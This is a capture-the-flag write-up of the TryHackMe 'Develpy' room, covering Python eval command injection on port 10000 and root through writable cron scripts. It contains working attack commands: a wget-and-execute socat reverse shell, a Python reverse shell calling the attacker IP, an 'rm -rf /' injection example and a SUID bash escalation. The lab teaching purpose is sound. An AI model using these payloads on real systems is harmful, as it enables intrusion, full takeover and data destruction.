# Develpy

## Introduction:

Welcome to my another writeup! In this TryHackMe [Develpy](https://tryhackme.com/room/bsidesgtdevelpy) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> boot2root machine for FIT and bsides Guatemala CTF

> Difficulty: Medium

- Overall difficulty for me: Easy
    - Initial foothold: Easy
    - Privilege Escalation: Easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# export RHOSTS=10.10.125.206
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt 
[...]
Open 10.10.125.206:22
Open 10.10.125.206:10000
```

**Nmap:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nmap -sT -T4 -sC -sV -p22,10000 $RHOSTS
[...]
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
```

According to `rustscan` and `nmap` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.2p2 Ubuntu
10000             | HTTP?

## Port 10000

**`nc` connection:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nc -nv $RHOSTS 10000
(UNKNOWN) [10.10.125.206] 10000 (webmin) open

        Private 0days

 Please enther number of exploits to send??: 4

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.018 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.052 ms
Exploiting tryhackme internal network: beacons_seq=3 ttl=1337 time=0.098 ms
Exploiting tryhackme internal network: beacons_seq=4 ttl=1337 time=0.02 ms
```

Looks like this port is doing `ping`ing a machine.

Hmm... What if there is no input sanitization?

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nc -nv $RHOSTS 10000
(UNKNOWN) [10.10.125.206] 10000 (webmin) open

        Private 0days

 Please enther number of exploits to send??: 1'
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1
    1'
     ^
SyntaxError: EOL while scanning string literal
```

We trigger a python error! Also, we did saw it's code a little bit:

```py
num_exploits = int(input(' Please enther number of exploits to send??: '))
```

So, we can guess what it's doing:

```py
#!/usr/bin/env python3

import os

print("""
        Private 0days
	""")

num_exploits = int(input(' Please enther number of exploits to send??: '))

os.system("ping -c %i 127.0.0.1" % num_exploits)
```

# Initial Foothold

As I digging deeper in the rabbit hole, I found that there is a [PDF](https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf) that talking about `python` command injection:

```py
__import__('os').system('rm –rf /')
```

> The `__import__` function **dynamically imports the module** named by the string provided, so this invokes the standard `os.system` function that invokes a shell to execute the given command (`rm –rf /`) which removes the filesystem root if the process has sufficient privileges.

Let's try to import `os` module!

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nc -nv $RHOSTS 10000
(UNKNOWN) [10.10.125.206] 10000 (webmin) open

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('whoami')
king

Exploit started, attacking target (tryhackme.com)...
```

Boom! We got a command injection! Let's leverage this into a reverse shell via `socat`:

```
┌──(root💀siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80

┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
[...]

┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nc -nv $RHOSTS 10000
(UNKNOWN) [10.10.125.206] 10000 (webmin) open

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:443 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane')
[...]
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
2022/09/05 05:13:13 socat[24256] N opening character device "/dev/pts/1" for reading and writing
2022/09/05 05:13:13 socat[24256] N listening on AF=2 0.0.0.0:443
                                                                2022/09/05 05:14:51 socat[24256] N accepting connection from AF=2 10.10.125.206:40134 on AF=2 10.18.61.134:443
                                                     2022/09/05 05:14:51 socat[24256] N starting data transfer loop with FDs [5,5] and [7,7]
                   king@ubuntu:~$ 
king@ubuntu:~$ stty rows 22 columns 121
king@ubuntu:~$ export TERM=xterm-256color
king@ubuntu:~$ ^C
king@ubuntu:~$ ^C
```

We're user `king`!

> Note: After I rooted this machine, I found that you can just spawn a `bash` shell, which is much easier! `__import__('os').system('bash')`

**user.txt:**
```
king@ubuntu:~$ cat user.txt 
{Redacted}
```

# Privilege Escalation

## king to root

> There are 2 ways to escalate to root.

In the **home** directory of the user `king`, we can see there are some interesting files:

```
king@ubuntu:~$ ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
```

**root.sh:**
```bash
python /root/company/media/*.py
```

Not sure what we can do with the `root.sh` file right now.

**run.sh:**
```bash
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
```

This `run.sh` Bash script will:

- Kill a certain process inside the `/home/king/.pid` file
- Open port 10000 for the `exploit.py` python script
- Echo the `socat` process to `/home/king/.pid`

**exploit.py:**
```py
#!/usr/bin/python
import time, random
print ''
print '        Private 0days'
print ''
num_exploits = int(input(' Please enther number of exploits to send??: '))
print ''
print 'Exploit started, attacking target (tryhackme.com)...'
for i in range(num_exploits):
    time.sleep(1)
    print 'Exploiting tryhackme internal network: beacons_seq={} ttl=1337 time=0.0{} ms'.format(i+1, int(random.random() * 100))
```

**credentials.png:**
```
king@ubuntu:~$ python3 -m http.server 8000

┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# wget http://$RHOSTS:8000/credentials.png
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a1.png)

Hmm... I vaguely remember this is something called `npiet`...

We can decode it from https://www.bertnase.de/npiet/npiet-execute.php:

```
Info: upload status: Ok
Warning: imagecreatefrompng(): gd-png: fatal libpng error: Not enough image data in /home/www/bn/npiet/npiet-execute.php on line 247

Warning: imagecreatefrompng(): gd-png error: setjmp returns error condition 3 in /home/www/bn/npiet/npiet-execute.php on line 247

Warning: imagecreatefrompng(): 'npiet-execute/credentials.png' is not a valid PNG file in /home/www/bn/npiet/npiet-execute.php on line 247

Info: Oops - no suitable picture found: no useful image format...
Info: Trying to execute anyway...

Info: executing: npiet -w -e 220000 credentials.png

libpng error: Not enough image data
```

Turns out it just a *rabbit hole*.

**Cronjob:**
```
[...]
# m h dom mon dow user	command
[...]
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
```

In the `/etc/crontab`, we can see that there are 3 cronjobs are running.

The `root	cd /home/king/ && bash root.sh` looks exploitable, since we're user `king`, thus has right to modify the `root.sh` Bash script!

**To do so, I'll:**

- Backup the orignal `root.sh`:

```
king@ubuntu:~$ mv root.sh root.sh.bak
```

- Create a malicious `root.sh` to escalate our privilege:

```
king@ubuntu:~$ cat << EOF > root.sh
> chmod +s /bin/bash
> EOF
king@ubuntu:~$ chmod +x root.sh
```

This will add a **SUID set bit** to `/bin/bash`, which means we can leverage this to spawn a root shell.

- Wait for the cronjob runs, and then spawn a root shell:

```
king@ubuntu:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash

king@ubuntu:~$ /bin/bash -p
bash-4.3# whoami;hostname;id;ip a
root
ubuntu
uid=1000(king) gid=1000(king) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(king)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:28:66:4e:ff:e7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.125.206/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::28:66ff:fe4e:ffe7/64 scope link 
       valid_lft forever preferred_lft forever
```

We're root! :D

## king to root

In listing all listening ports via `netstat`, we can see that port 8080 is open on localhost:

```
king@ubuntu:~$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -               
```

Let's do a local port forwarding via `chisel`:

- Transfer `chisel` to the target machine:

```
┌──(root💀siunam)-[/opt/chisel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

king@ubuntu:~$ wget http://10.18.61.134/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

- Setup a server listener on port 8888:

```
┌──(root💀siunam)-[/opt/chisel]
└─# ./chiselx64 server -p 8888 --reverse
```

- Connect to the server listener via client mode:

```
king@ubuntu:~$ /tmp/chisel client 10.18.61.134:8888 R:8001:127.0.0.1:8080
```

- Nmap the port:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nmap -sT -T4 -sC -sV -p8001 127.0.0.1
[...]
PORT     STATE SERVICE      VERSION
8001/tcp open  vcom-tunnel?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 05 Sep 2022 09:55:01 GMT
|     Server: WSGIServer/0.2 CPython/3.5.2
|     Content-Type: text/html
|     Content-Length: 101
|     X-Frame-Options: SAMEORIGIN
|     <h1>Not Found</h1><p>The requested URL /nice ports,/Trinity.txt.bak was not found on this server.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
[...]
```

Looks like it's a HTTP service! Let's go to `http://localhost:8001` to see what is it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a3.png)

A website's backend written in `python`... Maybe `django` or `flask`? Anyways, it has a upload function! Maybe we can upload a python reverse shell?

**Create a python reverse shell:** (From [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))

**revshell.py:**
```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.61.134",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

**Upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Develpy/images/a6.png)

Wait. Not found? 

Hmm... Take a step back. Let's enumerate the system again.

**Cronjob:**
```
# m h dom mon dow user	command
[...]
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
```

As we can see, there are 3 cronjobs are running.

Also, we can find that in `king`'s home directory, there is a Bash script called `root.sh`:

**root.sh:**
```bash
python /root/company/media/*.py
```

Which is our uploaded file's directory, and the cronjob will run any python script in that directory.

We can confirm that via [`pspy`](https://github.com/DominicBreuker/pspy):

- Transfer the `pspy` binary:

```
┌──(root💀siunam)-[/opt/pspy]
└─# python3 -m http.server 80

king@ubuntu:~$ wget http://10.18.61.134/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy
```

- Run it:

```
king@ubuntu:~$ /tmp/pspy
[...]
2022/09/05 03:18:01 CMD: UID=0    PID=3255   | python /root/company/media/revshell.py
```

Now we can setup a `nc` listener, and wait for the cronjob runs:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Develpy]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.208.69] 52020
/bin/sh: 0: can't access tty; job control turned off
# whoami;hostname;id;ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:20:44:86:68:bd brd ff:ff:ff:ff:ff:ff
    inet 10.10.208.69/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20:44ff:fe86:68bd/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
bash-4.3# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Python Command Injection
2. Privilege Escalation via Misconfigured Cronjob for `root.sh`
3. Local Port Forwarding
4. Privilege Escalation via Uploading Python Reverse Shell & Trigger It Via Cronjob